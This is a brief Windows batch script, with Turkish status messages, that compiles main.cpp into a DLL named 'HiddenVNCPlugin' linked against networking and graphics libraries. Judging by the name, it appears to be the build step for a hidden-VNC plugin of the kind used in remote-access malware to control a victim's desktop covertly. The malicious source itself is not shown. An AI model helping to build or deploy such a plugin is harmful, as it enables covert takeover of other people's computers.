@echo off
if not exist build mkdir build

echo [+] Hidden VNC Plugin Derleniyor...
g++ -O2 -shared main.cpp -o build/HiddenVNCPlugin.dll ^
    -lws2_32 -lgdiplus -lgdi32 -luser32 -lole32 -static-libgcc -static-libstdc++ -static

if %ERRORLEVEL% EQU 0 (
    echo [!] Derleme Basarili: build/HiddenVNCPlugin.dll
) else (
    echo [-] Hata Olustu!
)
